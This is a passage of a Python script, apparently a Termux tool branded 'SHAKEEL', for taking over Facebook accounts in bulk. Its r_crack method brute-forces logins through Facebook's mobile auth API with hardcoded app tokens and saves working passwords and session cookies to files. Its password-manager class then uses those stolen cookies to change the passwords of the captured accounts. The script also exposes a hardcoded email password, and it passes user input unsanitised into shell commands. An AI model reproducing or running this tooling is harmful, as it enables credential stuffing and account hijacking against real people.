					cp.append(uid)
					open('/sdcard/SHAKEEL_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method4(uid,nm,pwx)
		except Exception as e:
			self.method4(uid,nm,pwx)
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SHAKEEL] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"device":"Samsung",
"sdk":"Android",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': R_Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SHAKEEL_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SHAKEEL_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SHAKEEL_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.r_crack(uid,pwx)
		except Exception as e:
			print(e)
class Join:
	def __init_(self):
		logo()
		#s.system("xdg-open https://wa.me/+923152056613")
	def Whatsapp(self):
		os.system('xdg-open https://chat.whatsapp.com/HF3burNYuZx0den94ooYbk')
		iAmMain().iAmMenu()
	def Facebook(self):
		os.system('xdg-open https://facebook.com/groups/124939013896146/')
		iAmMain().iAmMenu()

class Grep:
	def __init__(self):
		logo()

	def remove_links(self):
		file = input(" [✓] File Path :- ")
		try:
			open(file,'r').read()
			print("	[✓]	Example  /sdcard/file1.txt  ")
			out = input("  [=] Save Path :- ")
			os.system('touch '+out)
			os.system('sort -r '+file+' | uniq > '+out)
			p("  [ All double links are Removed ] ")
			p(" [•] Your File Saved in %s "%(out))
			input("  [ Press Enter To Go Back ] ")
			time.sleep(1)
			self.remove_links()
		except:
			p("  [ File Not Found ]  ");sp(1);self.remove_links()


	def links_only(self):
		os.system("rm -rf .tmp.txt")
		try:
			p(" [  Example  :-  /sdcard/file.txt  ] ")
			file = input(" [•|•] Enter File Path :- ")
			line()
			p("	Example  :-  /sdcard/file1.txt  ")
			sav = input(" [✓] Enter Save Path :- ")
			line()
			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
			try:
				limit = int(input(" [•|•] how many links you wants to grep :- "))
				line()
			except:
				limit = 1
			t = open(file,"r").read().splitlines()
			xx = open(".tmp.txt","a")
			for x in t:
				uid = x.split("|")[0]
				xx.write(uid+'\n')
				xx.close()
			p("	  Example  :-  100089,88,87 etc")
			for n in range(limit):
				print(open(".tmp.txt","r").read().splitlines())
				digit = int(input(" [•|•] Enter Digit %s :- "%(n+1)))
				line()
				os.system('cat .tmp.txt | grep '+str(digit)+' >>'+sav+' ')
				p(" [	Your File Saved in :- %s ]  "%(sav))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.links_only()
		except Exception as e:
				print(" [^=^] Your File Not Found :( ")
				sp(2);self.links_only()


	def with_names(self):

		try:
			p("	Example  :-  /sdcard/file.txt	")
			line()
			file = input(" [✓] File Path :- ")
			line()
			p("	Example  :-  /sdcard/file1.txt	")
			ofile= input(" [✓] File Save Path :- ")
			line()
			try:
				p("	 Example :-  1 ,2,3,4,5 etc	")
				limit = int(input(" [=] How many Links with names you wanna grab :- "))
			except:
				limit = 2
			p("	Example  :-	100089 , 100088 etx  ")
			for n in range(limit):
				line()
				digit = int(input(" [•|•] Put Digits %s :- "%(n+1)))
				os.system('cat '+file+' | grep '+str(digit)+' >>'+ofile+' ')
				p(" [	Your File Saved in :- %s ]  "%(ofile))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.with_names()
		except:
			p("	[X] File Not Found ;(  ");sp(1);self.with_names()


class Server:
	def report(self):
		logo()
		print(" [•] Ex Cp issues/New updates Etc ")
		print(' [•] Please Describe issues in details\n [•] It will be send to Admin ')
		line()
		issue = input(' [•] Describe your Problem : ')
		name = input(' [•] Enter Your Name :- ')
		email = input(' [•] Enter Your Email/Contact/Fb Link : ')
		print(' [•] Sending Your Appeal .....')
		form = f'	__________________\n	Full Name : {name} \n	Email  : {email} \n	Issues : {issue} '
		TEXT = form
		SUBJECT = " Dilute Codes Users Feedback"
		message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
		se = "serverdilute@gmail.com"
		rse = "serverdilute@merry.pink"
		username = "serverdilute@gmail.com"
		password = "usqscwnpoyehoytc"
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.ehlo()
		server.starttls()
		server.login(username, password)
		server.sendmail(se, rse, message)
		print(" [•] Your Appleal Has been Submitted ")
		print(form)
		exit()

		
class automation:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def menu(self):
		logo()
		
		p(" [1] Facebook Password Change Menu ")
		p(' [2] Cut Used File lines ')
		am = input(" [•] Select an option : ")
		if am == "1":self.iAmPasswordManager()
		elif am == "2":self.used_cutter()
		else:
			p(" [•] wrong select!! ");sp(2);self.menu()
	def used_cutter(self):
		clear()
		logo()
		lines=[]
		p(" [•] Ex : /sdcard/file.txt")
		try:
			file = input(" [•] Put File Path : ")
		except Exception as e:
			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
		digit= int(input(" [•] Put Line Num :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		p(" [•] File Splitted Complete")
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : SHAKEEL")
		line()
		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
		line()
		iamoption = input(' [•] Choose : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmApprovelSystem()
		else:
			p(" [•] Wrong Select ! ")
			sp(2);self.iAmPasswordManager()
	
	def bulk_password(self):
		sav = "/sdcard/dilute_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "SHAKEEL@@@"
		logo()
		p(" [•] Password Changer By : SHAKEEL")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(" [•] Put File Path : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(" [•] File Not Found ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(" [•] Password Changing Procces is started ! ")
		line()
		p(" [•] Total File Accounts : %s "%(len(id)))
		line()
		p(" [•] Please Be Patience Use Fast Internet ")
		line()
		for x in id:
			uid = x.split("|")[0]
			pw = x.split('|')[1]
			cok = x.split('|')[2]
			cookies = {"cookie":cok}
			
			try:
				r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
			except CE:
				p(" [•] Check Your Internet")
			except Exception as e:
				print(e)
			if "/zero/optin/write/?" in r:
				self.iAmFreeMode(cookies,r)
			try:
				r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
				r= r.replace("amp;","")
			except CE:
				print(" [•] Check Your Internet Unexpected Stopped ! ")
				exit()
			
			next = re.findall('action\="(.*?)"',r)[1]
			data = {
		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
			po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
			po = po.replace("amp;","")
			if 'Password changed' in po:
				p(" [•]  \033[1;92m✓ Password Changed Succesfully : \033[1;97m%s "%(uid))
				open(sav,"a").write(uid+'|'+np+'\n')
			else:
				p(" [•]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
		line()
		print(" [•] Proccess Has Been Completed ! ")
		print(" [•] Your File Saved in %s "%(sav))
		line()
		input(" [•] Press Enter To Go Back to Password Menu ! ")
		sp(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "SHAKEEL"
		logo()
		p(" [•] Password Changer By : SHAKEEL ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(" [•] Put Old Pass : ")
		cok = input(" [•] Paste Cookies : ")
		cookies = {'cookie':cok}
		try:
			r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
		except CE:
			p(" [•] Check Your Internet")
		except Exception as e:
			print(e)
		if "/zero/optin/write/?" in r:
			self.iAmFreeMode(cookies,r)
		r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
		po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
		
		po = po.replace("amp;","")
		if 'Password changed' in po:
			p(" [•]  ✓ Password Changed Succesfully ")
			
			sp(2)
			input(" [•] Press Enter To Go Backk")
			self.iAmPasswordManager()
		else:
			p(" [•] Failed To Changed Password ")
	def iAmFreeMode(self,cookies,r):
		for x in re.findall('action\=\"(.*?)"',r):
			if "/zero/optin/write/?" in x:
				next = x
		data ={}
		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).group(1)
		jazoest = re.search('name="jazoest" value="(.*?)"',r).group(1)
		data.update(
		{
		'fb_dtsg':fb_dtsg,
		'jazoest':jazoest,
		'submit':'Continue'
		}
		)
		po = requests.post('https://free.facebook.com'+str(x),cookies=cookies,data=data,allow_redirects=False)
	
	def change_default(self):
		logo()
		
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "SHAKEEL786"
		p(" [•] Default Password : %s"%(iamdefaultpassword))
		line()
		os.system("rm -rf .default_password.txt ")
		change_pw = input(" [•] Put New Default Password : ")
		if len(change_pw) < 6:
			print(" [•] Password Should be Six Characters More .")
			sp(2)
			self.change_default()
		
		t = open(".default_password.txt","w").write(change_pw)
		print(" [•] Default Password is Changed ! ")
		p(" [•] Your New Password : %s "%(change_pw))
		line()
		input("[•] Press Enter to go back ")

		self.iAmPasswordManager()







if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
	iAmMain().method4('61555127032115','zaydan123',['Muhammad Siyal'])